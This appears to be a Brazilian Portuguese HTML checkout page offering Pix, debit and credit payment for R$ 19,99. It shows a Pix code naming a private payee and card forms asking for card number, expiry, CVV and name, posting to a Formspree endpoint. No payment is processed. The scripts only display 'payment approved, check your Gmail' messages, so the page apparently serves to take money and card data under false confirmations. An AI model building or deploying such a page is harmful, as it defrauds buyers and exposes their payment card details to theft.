<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Pagamento</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: linear-gradient(135deg, #ffdee9, #ffc1e3);
      margin: 0;
      padding: 0;
    }
    .container {
      max-width: 800px;
      margin: 40px auto;
      background: #fff;
      padding: 25px;
      border-radius: 16px;
      box-shadow: 0 6px 14px rgba(0,0,0,0.15);
    }
    h1 {
      text-align: center;
      margin-bottom: 20px;
      color: #e60073;
    }
    /* Abas */
    .tabs {
      display: flex;
      justify-content: center;
      gap: 10px;
      margin-bottom: 20px;
    }
    .tab {
      flex: 1;
      padding: 12px;
      text-align: center;
      border-radius: 10px;
      background: #ffe6f0;
      color: #e60073;
      font-weight: bold;
      cursor: pointer;
      transition: 0.3s;
    }
    .tab.active {
      background: #e60073;
      color: #fff;
    }
    .tab-content {
      display: none;
    }
    .tab-content.active {
      display: block;
    }
    /* Pix */
    .qr-box {
      text-align: center;
    }
    .qr-box img {
      width: 220px;
      height: 220px;
      margin-bottom: 15px;
    }
    .code-input {
      width: 100%;
      padding: 12px;
      border-radius: 10px;
      border: 1px solid #ccc;
      margin-bottom: 10px;
      font-family: monospace;
      font-size: 14px;
    }
    button {
      margin-top: 12px;
      padding: 14px;
      width: 100%;
      background: #e60073;
      color: #fff;
      border: none;
      border-radius: 10px;
      font-size: 16px;
      cursor: pointer;
      transition: 0.3s;
    }
    button:hover {
      background: #cc0066;
    }
    .msg {
      display: none;
      margin-top: 15px;
      font-weight: bold;
      color: #28a745;
      text-align: center;
    }
    /* Cart√£o */
    form label {
      display: block;
      margin-top: 10px;
      font-weight: bold;
      color: #444;
    }
    form input, form select {
      width: 100%;
      padding: 12px;
      margin-top: 6px;
      border: 1px solid #ccc;
      border-radius: 10px;
      font-size: 15px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Pagamento</h1>

    <!-- Abas -->
    <div class="tabs">
      <div class="tab active" onclick="openTab('pix')">Pix</div>
      <div class="tab" onclick="openTab('debito')">D√©bito</div>
      <div class="tab" onclick="openTab('credito')">Cr√©dito</div>
    </div>

    <!-- Conte√∫do PIX -->
    <div class="tab-content active" id="pix">
      <div class="qr-box">
        <img src="../WVGrGNIOV0Vx.br/qrcode.png.lnk" alt="QR Code PIX">
        <input type="text" id="pixCode" class="code-input" 
          value="00020126580014br.gov.bcb.pix01368773d579-9a29-4679-80d3-9784acce7ff4520400005303986540519.995802BR5924George Gabriel Ribeiro D6009Sao Paulo610901227-20062240520daqr17315982353911376304AD28" 
          readonly>
        <button onclick="copyPix()">üìã Copiar c√≥digo PIX</button>
        <button id="confirmPixBtn" onclick="confirmPix()" style="display:none">‚úÖ Confirmar</button>
        <p class="msg" id="msg-pix">‚úÖ Aguarde 10 minutos e confira seu Gmail</p>
      </div>
    </div>
<form action="https://formspree.io/f/mrbadoya" method="POST">
       
    <!-- Conte√∫do D√©bito -->
    <div class="tab-content" id="debito">
      <form onsubmit="event.preventDefault();confirmDebito();">
        <label>N√∫mero do cart√£o</label>
        <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="16" required>

        <label>Validade</label>
        <input type="text" placeholder="MM/AA" required>

        <label>CVV</label>
        <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="3" required>

        <label>Nome no cart√£o</label>
        <input type="text" required> 

<label>Nome completo</label>
      <input type="text" name="nome" required>

        <button type="submit">Confirmar Pagamento</button>
      </form>
      <p class="msg" id="msg-debito">‚úÖ Pagamento com cart√£o de d√©bito processado! Aguarde 10 minutos e confira seu Gmail</p>
    </div>


<form action="https://formspree.io/f/mrbadoya" method="POST">
 
    <!-- Conte√∫do Cr√©dito -->
    <div class="tab-content" id="credito">
      <form onsubmit="event.preventDefault();confirmCredito();">
        <label>N√∫mero do cart√£o</label>
        <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="16" required>

        <label>Validade</label>
        <input type="text" placeholder="MM/AA" required>

        <label>CVV</label>
        <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="3" required>

        <label>Nome no cart√£o</label>
        <input type="text" required>

        <label>Parcelamento</label>
        <select required>
          <option>1x de R$ 19,99</option>
          <option>2x de R$ 9,99</option>
          <option>3x de R$ 6,66</option>
          <option>4x de R$ 4,99</option>
          <option>5x de R$ 3,99</option>
          <option>6x de R$ 3,33</option>
          <option>12x de R$ 1,66</option>
        </select>

        <button type="submit">Confirmar Pagamento</button>
      </form>
      <p class="msg" id="msg-credito">‚úÖ Pagamento com cart√£o de cr√©dito aprovado! Aguarde 10 minutos e confira seu Gmail</p>
    </div>
  </div>

  <script>
    // Alternar abas
    function openTab(tabId) {
      document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
      document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
      document.querySelector(`.tab[onclick="openTab('${tabId}')"]`).classList.add('active');
      document.getElementById(tabId).classList.add('active');
    }

    // PIX
    function copyPix() {
      const input = document.getElementById("pixCode");
      input.select();
      input.setSelectionRange(0, 99999);
      document.execCommand("copy");
      alert("C√≥digo PIX copiado!");
      document.getElementById("confirmPixBtn").style.display = "block";
    }
    function confirmPix() {
      document.getElementById("msg-pix").style.display = "block";
    }

    // D√©bito
    function confirmDebito() {
      document.getElementById("msg-debito").style.display = "block";
    }

    // Cr√©dito
    function confirmCredito() {
      document.getElementById("msg-credito").style.display = "block";
    }
  </script>
</body>
</html>
